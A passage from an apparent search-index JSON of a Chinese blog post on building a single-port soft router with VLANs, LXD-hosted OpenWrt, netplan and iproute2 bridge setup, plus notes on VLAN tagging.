<li>\u65c1\u8def\u7531\uff0c\u4e4b\u524d\u6211\u4e5f\u5199\u8fc7\u4f7f\u7528\u6811\u8393\u6d3e\u5b9e\u73b0\u900f\u660e\u4ee3\u7406\u3002\u8be5\u65b9\u5f0f\u9700\u8981\u4fee\u6539\u4e0a\u7f51\u8bbe\u5907\u7684\u7f51\u5173\u4e3a\u65c1\u8def\u8bbe\u5907\u3002<ul> <li>\u7f51\u4e0a\u4e89\u8bba\u6bd4\u8f83\u591a\u7684\u662f\u662f\u5426\u4f1a\u6709\u4e24\u6b21 NAT\uff0c\u5176\u5b9e\u4e0d\u8bba\u600e\u6837\uff0c\u4e3b\u8def\u7531\u5fc5\u7136\u8981\u8d77\u5230\u4e00\u6b21 NAT\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u4e3b\u8def\u7531\u7684\u6027\u80fd\u81f3\u5c11\u4e0d\u80fd\u592a\u5f31\u3002\u5f53\u7136\u5982\u679c\u5bb6\u91cc\u53ea\u6709 100M \u7684\u5bbd\u5e26\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e5f\u8bb8\u8db3\u591f\u3002\u4f46\u662f\u5982\u679c\u65c1\u8def\u8bbe\u5907\u7684\u6027\u80fd\u5f88\u5f3a\u7684\u8bdd\uff0c\u6027\u80fd\u8fd8\u662f\u767d\u767d\u6d6a\u8d39\u4e86\u3002\u4e0d\u5982\u8fd9\u91cc\u4ecb\u7ecd\u7684 vlan \u65b9\u5f0f\u3002</li> </ul> </li> <li>\u4e5f\u770b\u5230\u4e86\u4f7f\u7528 vlan \u5b9e\u73b0\u6211\u8fd9\u79cd\u8f6f\u8def\u7531\u7684\u73a9\u6cd5\uff0c\u4f46\u662f\u9700\u8981\u4e00\u4e2a\u786c\u4ef6\u4ea4\u6362\u673a\u3002\u77e5\u9053\u4f7f\u7528\u666e\u901a openwrt \u8bbe\u5907\u5c31\u53ef\u4ee5\u5b9e\u73b0 vlan \u7684\u8fd8\u662f\u4e0d\u591a\u3002</li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ul> <li>\u53f8\u6ce2\u56fe\uff1a\u4f7f\u7528\u7b14\u8bb0\u672c + PVE\uff0c\u5355\u7f51\u53e3\u5b9e\u73b0\u8f6f\u8def\u7531\uff1a\u4e00\u4e2a\u7f51\u53e3\u4e5f\u80fd\u505a\u8f6f\u8def\u7531\uff1f\u95f2\u7f6e\u7535\u8111\u518d\u5229\u7528\uff01 - YouTube<ul> <li>\u4e0d\u8fc7\u8fd9\u91cc\u7684\u7ed3\u6784\u53ea\u9002\u7528\u4e8e pppoe \u4e0a\u7f51\u65b9\u5f0f\uff0c\u5bf9\u4e8e dhcp \u4e0a\u7f51\u65b9\u5f0f\u5219\u4e0d\u9002\u7528\uff08\u6b64\u7ed3\u6784\u4e2d\u53ea\u6709\u8f6f\u8def\u7531\u4e00\u4e2a dhcp \u670d\u52a1\u5668\uff0c\u4e0d\u7528\u8003\u8651 dhcp \u51b2\u7a81\u3002\u5bf9\u4e8e dhcp \u4e0a\u7f51\u65b9\u5f0f\u5219\u9700\u8981\u4f7f\u7528 vlan \u9694\u79bb ISP \u7684 dhcp \u548c\u8f6f\u8def\u7531\u7684 dhcp \u670d\u52a1\uff09</li> <li>\u7ed3\u6784\uff1a</li> </ul> </li> </ul> <ul> <li>\u5229\u7528\u6811\u8393\u6d3e + LXC \u8fd0\u884c\u591a\u4e2a\u670d\u52a1\uff0c\u5e76\u4f7f\u7528 Openwrt \u4f5c\u4e3a\u9632\u706b\u5899\u7ba1\u7406\uff1awww.makikiweb.com/Pi/lxc_openwrt.html<ul> <li>\u65b0\u7248\u6559\u7a0b\uff1awww.makikiweb.com/Pi/virtual_openwrt_on_lxd.html</li> </ul> </li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u5355\u7f51\u53e3\u5b9e\u73b0\u8f6f\u8def\u7531","title":"\u5355\u7f51\u53e3\u5b9e\u73b0\u8f6f\u8def\u7531","text":"","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u67b6\u6784\u56fe","title":"\u67b6\u6784\u56fe","text":"<p>switch:</p> <ul> <li>\u7eff\uff1a\u7aef\u53e3  </li> <li>\u6a59\uff1a\u8bbe\u5907  </li> <li>\u865a\u7ebf\uff1a\u865a\u62df\u8bbe\u5907  </li> <li>\u84dd\uff1a\u7f51\u6865  </li> <li>\u7070\uff1a\u7f51\u7edc\u63a5\u53e3 </li> </ul> <p>DSA</p> <ul> <li>\u6a59\uff1a\u8bbe\u5907  </li> <li>\u865a\u7ebf\uff1a\u865a\u62df\u8bbe\u5907  </li> <li>\u84dd\uff1a\u7f51\u6865  </li> <li>\u7eff\uff1a\u7f51\u7edc\u63a5\u53e3 </li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#1-\u8bbe\u7f6e-host","title":"1. \u8bbe\u7f6e host","text":"","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#lxc","title":"lxc","text":"<p>\u5b89\u88c5 lxd</p> <pre><code>sudo apt install lxd   # \u5b89\u88c5lxd\nlxd init  # \u4f1a\u8bbe\u7f6e\u5b58\u50a8\u6c60\uff0c\u7f51\u7edcbridge\uff0c\u5168\u90e8\u9ed8\u8ba4\u5373\u53ef\n</code></pre> <p>\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u4e24\u4e2a\u7f51\u7edc\u63a5\u53e3\u7684 profile\uff0c\u7528\u4e8e openwrt\u3002\uff08\u8fd8\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u53ea\u5305\u542b br1 \u7684 profile\uff0c\u7528\u4e8e\u5176\u4f59 lxc \u5bb9\u5668\uff09</p> <pre><code>lxc profile create twointf\nlxc profile edit twointf\n</code></pre> <p>\u5185\u5bb9</p> <pre><code>config: {}\ndescription: 2 interfaces\ndevices:\n  eth0:\n    name: eth0\n    nictype: bridged\n    parent: br1\n    type: nic\n  eth1:\n    name: eth1\n    nictype: bridged\n    parent: br0\n    type: nic\n  root:\n    path: /\n    pool: default\n    type: disk\nname: twointf\n</code></pre> <p>\u62c9\u53d6 openwrt \u955c\u50cf</p> <pre><code>lxc image copy images:openwrt/22.03 local: --copy-aliases --auto-update\n</code></pre>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#bridge-vlan","title":"bridge, vlan","text":"<p>\u8bbe\u7f6e netplan\uff0c\u6309\u7167 bridge, vlan \u8282\uff0c\u521b\u5efa\u4e24\u4e2a vlan \u548c br0, br1\u3002</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#2-\u8def\u7531\u5668-vlan-\u8bbe\u7f6e","title":"2. \u8def\u7531\u5668 vlan \u8bbe\u7f6e","text":"<p>\u89c1\u540e\u9762 DSA \u8bbe\u7f6e\u8282</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u6027\u80fd\u6d4b\u8bd5","title":"\u6027\u80fd\u6d4b\u8bd5","text":"<p>\u4ece\u5b9e\u9a8c\u5ba4\u5230\u5bdd\u5ba4\u7684 wireguard \u96a7\u9053\u53ef\u4ee5\u8fbe\u5230 500Mbs \u7684\u901f\u7387\uff0c\u5c06\u4e24\u6838 Cortex A53@1.2GHz \u51e0\u4e4e\u8dd1\u6ee1\u3002\u800c\u539f\u672c\u901a\u8fc7\u8def\u7531\u5668 (4 \u6838 MIPS 1004kc@880MHz) \u5219\u4ec5\u80fd\u8dd1\u5230 200Mbs\u3002 </p> <p>\u4e24\u8fb9\u5747\u4f7f\u7528\u8f6f\u8def\u7531\u540e\u8fbe\u5230\u5343\u5146\u6c34\u5e73\uff0cscp \u53ef\u4ee5\u8fbe\u5230 98MB/s \u7684\u901f\u7387\u3002</p> <p></p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u521b\u5efa-bridge-vlan","title":"\u521b\u5efa bridge, vlan","text":"","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#iproute2\u4e34\u65f6\u8bbe\u7f6e","title":"iproute2(\u4e34\u65f6\u8bbe\u7f6e)","text":"<ul> <li>bridge\uff1aNetwork bridge - ArchWiki (archlinux.org)</li> <li>vlan: VLAN - ArchWiki (archlinux.org)</li> </ul> <pre><code>lsmod |grep 802\n\n#\u6dfb\u52a0vlan\u548cbridge\nsudo ip link add link enp7s0 eth0.1 type vlan id 1\nsudo ip link add link enp7s0 eth0.2 type vlan id 2\nsudo ip link add name br0 type bridge\nsudo ip link add name br1 type bridge\n\n#set up\nsudo ip link set dev br0 up\nsudo ip link set dev br1 up\nsudo ip link set dev eth0.1 up\nsudo ip link set dev eth0.2 up\n\n#\u8bbe\u7f6ebridge master\nsudo ip link set eth0.2 master br1 \nsudo ip link set eth0.1 master br0\n</code></pre>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#netplannetworkmanager","title":"netplan/networkmanager","text":"<p>nmcli \u547d\u4ee4\u8fd8\u884c\uff0c\u4e0d\u8fc7\u914d\u7f6e\u590d\u6742\u7f51\u7edc\u65f6\u8fd8\u662f\u4f7f\u7528 netplan \u914d\u7f6e\u6587\u4ef6\u7684\u65b9\u5f0f\u66f4\u52a0\u9002\u5408</p> <pre><code>nmcli con add ifname br0 type bridge con-name br0\nnmcli con add type bridge-slave ifname enp7s0 master br0\nnmcli con up br0\n\nnmcli con add type vlan con-name vlan1 dev enp7s0 id 1\n</code></pre>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#netplannetworkd\u63a8\u8350","title":"netplan/networkd(\u63a8\u8350)","text":"<p>ubuntu \u684c\u9762\u7248\uff0cnetplan \u5e95\u5c42\u4f7f\u7528\u7684\u9ed8\u8ba4\u65f6 NetworkManger\u3002\u670d\u52a1\u5668\u7248\u5219\u662f networkd\uff0cnetworkd \u7684\u914d\u7f6e\u6587\u4ef6\u4f7f\u7528\u8d77\u6765\u66f4\u7b80\u5355\u4e9b\u3002</p> <p>\u914d\u7f6e\u6587\u6863\uff1aCanonical Netplan</p> <p>\u914d\u7f6e\uff1a</p> <pre><code>network:\n  version: 2\n  renderer: networkd\n  ethernets:\n    eth0:\n      dhcp4: false\n      dhcp6: false\n  vlans:\n    eth0.1:\n      link: eth0\n      id: 1\n    eth0.2:\n      link: eth0\n      id: 2\n  bridges:\n    br0:\n      interfaces:\n        - eth0.1\n    br1:\n      dhcp4: true\n      interfaces:\n        - eth0.2\n</code></pre> <p>\u914d\u7f6e\u5b8c\u6210\u540e\uff0c\u9700\u8981\u5e94\u7528\u4fee\u6539</p> <pre><code>netplan apply\n</code></pre>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u8bbe\u7f6e\u7f51\u5361\u56fa\u5b9a\u540d\u79f0","title":"\u8bbe\u7f6e\u7f51\u5361\u56fa\u5b9a\u540d\u79f0","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5f53\u673a\u5668 PCIE \u8bbe\u5907\u53d8\u5316\u65f6\uff0c\u7f51\u7edc\u63a5\u53e3\u540d\u5b57\u53ef\u80fd\u4f1a\u53d1\u751f\u53d8\u5316\uff08\u6bd4\u5982\u62d4\u63d2\u663e\u5361\uff09\u3002\u89e3\u51b3\u529e\u6cd5</p> <pre><code>vim /etc/udev/rules.d/80-net.rules\n\n# 80-net.rules\nSUBSYSTEM==\"net\", ACTION==\"add\", DRIVERS==\"?*\", ATTR{address}==\"7c:10:c9:a2:53:d8\", NAME=\"eth0\"\nSUBSYSTEM==\"net\", ACTION==\"add\", DRIVERS==\"?*\", ATTR{address}==\"38:fc:98:8d:f8:7e\", NAME=\"wlan0\"\n\nupdate-initramfs -u -k all    # -u (updates initramfs), -k all(specific all kernel version)\n</code></pre>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#openwrt-vlan-\u8bbe\u7f6e","title":"Openwrt VLAN \u8bbe\u7f6e","text":"<ul> <li>\u5b98\u65b9\u6587\u6863\uff1a[OpenWrt Wiki] VLAN</li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#vlan-q--a","title":"vlan Q &amp; A","text":"<ul> <li>vlan \u4f5c\u7528\u662f\u4ec0\u4e48\uff1f\uff1a\u5206\u79bb\u4e0d\u540c\u8bbe\u5907\uff08\u4f4d\u4e8e\u540c\u4e00\u4e2a LAN\uff09\u3002\u4f18\u70b9\uff1a\u4e0d\u7528\u8bbe\u7f6e\u5b50\u7f51\u6bb5\u548c\u8def\u7531\u3002</li> <li>vlan \u6807\u51c6\uff1aIEEE 802.1Q\u3002vlan \u4f1a\u5728\u4ee5\u592a\u7f51\u5e27\u4e2d\u6dfb\u52a0 4 \u5b57\u8282\uff0c\u56e0\u6b64\u901a\u4fe1\u53cc\u65b9\u5fc5\u987b\u8981\u90fd\u80fd\u8bc6\u522b vlan<ul> <li></li> </ul> </li> <li>\u54ea\u4e9b\u8bbe\u5907\u652f\u6301 vlan\uff1f\uff1a\u57fa\u672c\u4e0a\u6240\u6709\u8bbe\u5907\u90fd\u652f\u6301 vlan\uff08\u8f6f\u4ef6\u7684\u6216\u8005\u786c\u4ef6\u4ea4\u6362\u673a\uff09\u3002<ul> <li>\u5bf9\u4e8e\u6709\u591a\u4e2a\u7aef\u53e3\u7684\u5d4c\u5165\u5f0f\u8bbe\u5907\uff0c\u5185\u90e8\u901a\u5e38\u4f1a\u5305\u542b\u4e00\u4e2aVLAN-capable switch\uff0c\u6216\u8005\u79f0 managed switch\u3002\u7ba1\u7406\u4ea4\u6362\u673a\u548c\u8bbe\u5907\u5185\u90e8\u7684\u4e00\u4e2a ethernet \u63a5\u53e3\u8fde\u63a5\u5728\u4e00\u8d77\u3002\u7ba1\u7406\u4ea4\u6362\u673a\u53ef\u4ee5\u4e3a\u6bcf\u4e2a\u7aef\u53e3\u8bbe\u7f6e vlan id\uff0c\u5e76\u4e14\u53ef\u4ee5\u72ec\u7acb\u4e8e CPU \u5de5\u4f5c\u3002</li> <li>\u5bf9\u4e8e PC \u6216\u5219\u5355\u677f\u8ba1\u7b97\u673a\uff0c\u6bcf\u4e2a\u7aef\u53e3\u90fd\u6709\u4e00\u4e2a\u72ec\u7acb\u7684\u4ee5\u592a\u7f51\u63a7\u5236\u5668 (nic)\uff0cvlan \u901a\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u9a71\u52a8\u5b9e\u73b0\u3002</li> </ul> </li> <li>\u5982\u4f55\u67e5\u770b\u81ea\u5df1\u8bbe\u5907\u662f\u5426\u6709\u786c\u4ef6 switch\uff1f<ul> <li>\u901a\u8fc7<code>ls -l /sys/class/net</code>\u53ef\u4ee5\u67e5\u770b\u7269\u7406\u7684\u7f51\u7edc\u63a5\u53e3</li> <li>\u7528\u8fc7\u7684\u5c0f\u7c73\u8def\u7531\u5668\u5747\u6ca1\u6709\u4e13\u95e8\u7684 switch \u9875\u9762\uff0c\u540e\u9762\u624d\u77e5\u9053\u662f\u91c7\u7528\u4e86 DSA \u67b6\u6784\uff0c\u6bcf\u4e2a\u7aef\u53e3\u90fd\u663e\u5f0f\u4e3a\u4e00\u4e2a\u8bbe\u5907\uff0c\u5982 lan1, lan2, wan\u3002\u5b9e\u9645\u4e0a\u5747\u662f\u4f4d\u4e8e eth0 \u4e0b\u3002</li> </ul> </li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#tag-untag","title":"tag, untag","text":"<p>\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6216\u591a\u4e2a vlan id\uff0c\u4e0d\u540c vlan \u5bf9\u5e94\u4e00\u4e2a\u5e7f\u64ad\u57df</p> <p>port membership\uff1a\u6bcf\u4e2a\u7aef\u53e3\u53ef\u4ee5\u5c5e\u4e8e\u4e00\u4e2a\u6216\u591a\u4e2a vlan</p> <ul> <li>tag: \u8be5\u7aef\u53e3\u7684\u5305\u90fd\u5e26\u6709 vlan id\u3002\u7aef\u53e3\u8fde\u63a5\u7684\u5bf9\u9762\u5fc5\u987b\u662f vlan awareness \u7684</li> <li>untag: \u4ece\u8be5\u7aef\u53e3\u51fa\u53bb\u7684\u5305\u88ab\u5220\u9664\u6389 vlan id\u3002\u7528\u4e8e\u548c\u975e vlan \u7cfb\u7edf\u4ea4\u4e92 port PVID \u4ece\u8be5\u7aef\u53e3\u8fdb\u5165\u7684 untagged \u7684\u5305\uff0c\u88ab\u5212\u5206\u4e3a\u54ea\u4e2a vlan\u3002\uff08\u5982\u679c\u8be5\u7aef\u53e3\u6709 untag \u7684 VLAN id\uff0c\u5219\u5fc5\u7136\u5c31\u662f\u7b49\u4e8e\u8be5 vlan id\u3002\u5982\u679c\u8be5\u7aef\u53e3\u5168\u90e8\u90fd\u662f tag \u7684\uff0c\u5219\u9700\u8981\u989d\u5916\u6307\u5b9a\uff09</li> </ul> <p></p> <p>\u5728 Cisco \u672f\u8bed\u4e2d\uff0cuntag \u7aef\u53e3\u53eb\u505a vlan port\uff0ctag \u53eb\u505a trunk port\u3002</p> <ul> <li>PVID \u5373 untagged VLAN\uff0c\u6bcf\u4e2a\u7aef\u53e3\u53ea\u80fd\u6307\u5b9a\u4e00\u4e2a PVID\u3002\u8fd9\u6837\u5f53\u8be5\u7aef\u53e3\u6536\u5230untagged \u5305\u65f6\uff0c\u4fbf\u5c06\u5176\u5f52\u4e3a\u67d0\u4e2a VLAN \u57df\u3002</li> <li>untag \u63a5\u53e3\uff1a\u7528\u4e8e\u8fde\u63a5\u975e vlan \u7f51\u7edc</li> <li>trunk \u63a5\u53e3\uff1a\u611f\u89c9\u6307\u7684\u662f\u8be5\u7aef\u53e3\u4e0a\u5168\u662f tagged\uff0c\u7528\u4e8e\u4e00\u6839\u7ebf\u4f20\u8f93\u591a\u4e2a\u5b50\u7f51\u3002</li> <li>tag \u548c untag \u6df7\u5408\uff1a\u76ee\u524d\u4e0d\u77e5\u9053\u6709\u4ec0\u4e48\u4f5c\u7528</li> </ul> <p>VLANs and CPU(eth0), CPU(eth1) - Installing and Using OpenWrt / Network and Wireless Configuration - OpenWrt Forum</p> <ul> <li>eth0\uff0ceth1 \u542b\u4e49\uff1aswitch \u81ea\u8eab\u6709\u82e5\u5e72\u7aef\u53e3\uff08\u8def\u7531\u5668\u5916\u4fa7\u7684\u7aef\u53e3\uff09\uff0c\u5185\u90e8\u5230 cpu \u6709\u4e24\u4e2a\u7aef\u53e3</li> <li>\u4e2d\u95f4\u89e3\u91ca\u4e86 VLAN \u7684\u5de5\u4f5c\u8fc7\u7a0b\uff0c\u5176\u4e2d PVID \u7528\u4e8e\u5904\u7406 untagged \u60c5\u51b5</li> <li>\u63a5\u7740\u89e3\u91ca\u4e86 cpu \u7aef \u63a5\u53e3 tag \u7684\u4f5c\u7528\uff0c\u901a\u8fc7\u6307\u5b9a tag\uff0c\u4f1a\u521b\u5efa\u201c\u5b50\u63a5\u53e3\u201d(\u5982 eth0.1)\uff0c\u8fd9\u6837\u6bcf\u4e2a\u5b50\u63a5\u53e3\u90fd\u53ef\u4ee5\u6709\u72ec\u7acb\u7684\u5730\u5740\u3002</li> </ul> <p>There are two places that tagging is important, leaving out \"one-armed\" configurations; in the switch and on the interface itself. The switch works by \"wiring\" all ports that have the same VLAN together. When a packet arrives at a port, if it is untagged, it is given the PVID as a tag. If it is already tagged and it is a \"permitted\" VLAN tag, it retains the tag. Depending on the specifics of the switch and its driver, if it is not a permitted tag, the packet may be dropped (I haven't seen config parameters for this behavior nor looked for it in detail). Inside the switch, if the destination MAC address is on a port that permits the VLAN, then it is sent out that port. For broadcast packets, it is sent out all ports that permit that VLAN. If the port is tagged for that VLAN, the tag is retained. If the port is untagged for that VLAN, the tag is dropped. The interface can also have tags, each of which creates a \"sub-interface\" that can be accessed by the kernel, and through the kernel user-space applications. Each sub-interface \"filters\" to that specific VLAN, and tags outgoing packets with the VLAN. Each sub-interface (or bridge over that sub-interface) typically has its own IPv4 address, and its own set of IPv6 addresses. This allows \"trunking\" where one physical wire (which may be inside of the SoC or on the PCB) handles multiple subnets or streams of data. If you're only carrying one stream of data to/from a physical interface, you don't really need to use tagging as the switch's use of PVID is sufficient. Personally, when I can, I\u00a0always\u00a0use VLAN tags for clarity and future extensibility. That said, my network infrastructure uses many VLANs for segregation of traffic, monitoring, and firewalling. If you tag both eth0 and eth1 to the same VLAN, that should be OK, as long as they don't have the same IP address. It's like plugging them both into the same Ethernet cable. Most of what you describe will \"work\" if both the interfaces and the switch are configured properly, if you only have one stream of data to/from each of the physical interfaces. </p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u786c\u4ef6-switch-vlan","title":"\u786c\u4ef6 switch vlan","text":"<p>\u4e0b\u56fe\u4e3a\u4e00\u4e2a\u5e38\u89c1\u7684 5 \u7aef\u53e3\u8def\u7531\u5668\u7684 vlan \u8bbe\u7f6e\uff0c\u8be5\u8def\u7531\u5668\u53ea\u6709\u4e00\u4e2a\u7f51\u7edc\u63a5\u53e3 (eth0)\uff0c\u5305\u542b\u4e00\u4e2a\u5185\u7f6e\u7684\u4ea4\u6362\u673a\uff0c\u901a\u8fc7 vlan \u5c06 WAN \u548c LAN \u9694\u79bb\u3002 </p> <p>\u5bf9\u4e8e swtich \u5b9e\u73b0\u7684 vlan\uff0copenwrt \u6709\u4e00\u4e2a\u9875\u9762\u7528\u4e8e\u56fe\u5f62\u5316\u5730\u8bbe\u7f6e vlan\u3002\uff08\u4f7f\u7528 DSA \u67b6\u6784\u540e\u5c31\u6ca1\u4e86\uff0c\u89c1\u540e DSA \u8282\uff09</p> <p></p> <ul> <li>tagged:  The\u00a0tagged\u00a0port (<code>t</code>\u00a0is appended to the port number) is the one that forces usage of\u00a0VLAN\u00a0tags, i.e. when the packet is outgoing, the\u00a0VLAN\u00a0ID tag with\u00a0<code>vlan</code>\u00a0value is added to the packet, and when the packet is incoming, the\u00a0VLAN\u00a0ID tag has to be present and match the configured\u00a0<code>vlan</code>\u00a0value(s).</li> <li>untagged:  The\u00a0untagged\u00a0port is removing the\u00a0VLAN\u00a0ID tag when leaving the port \u2013 this is used for communication with ordinary devices that does not have any clue about VLANs. When the untagged packet arrives to the port, the default port\u00a0VLAN\u00a0ID (called\u00a0<code>pvid</code>) is assigned to the packet automatically. The\u00a0<code>pvid</code>\u00a0value can be selected by the\u00a0<code>switch_port</code>\u00a0section.</li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u8f6f\u4ef6-vlan","title":"\u8f6f\u4ef6 vlan","text":"<p>\u6bcf\u4e2a\u7269\u7406\u63a5\u53e3 (nic) \u53ef\u4ee5\u901a\u8fc7 vlan id \u865a\u62df\u51fa\u591a\u4e2a\u865a\u62df\u63a5\u53e3\uff08\u5982 eth0.1, eth0.2\uff09\u3002\u5f53\u5305\u8def\u7531\u5230\u5bf9\u5e94\u865a\u62df\u63a5\u53e3\u65f6\uff0c\u5305\u79bb\u5f00\u7269\u7406\u63a5\u53e3\u65f6\u4f1a\u6253\u4e0a\u5bf9\u5e94 tag\u3002\u5f53\u7269\u7406\u63a5\u53e3\u63a5\u6536\u5230\u5bf9\u5e94 tag \u7684\u5305\u65f6\uff0c\u5219\u4f1a\u8def\u7531\u5230\u5bf9\u5e94\u865a\u62df\u63a5\u53e3\uff08\u4e0d\u5b58\u5728\u5219\u4f1a drop\uff09\u3002</p> <p>A driver-level\u00a0VLAN\u00a0could be created in the\u00a0<code>interface</code>\u00a0section by adding a dot (<code>.</code>) and the respective\u00a0VLAN\u00a0ID after the interface name (in the\u00a0<code>ifname</code>\u00a0option), like\u00a0<code>eth1.2</code>\u00a0for\u00a0VLAN\u00a0ID 2 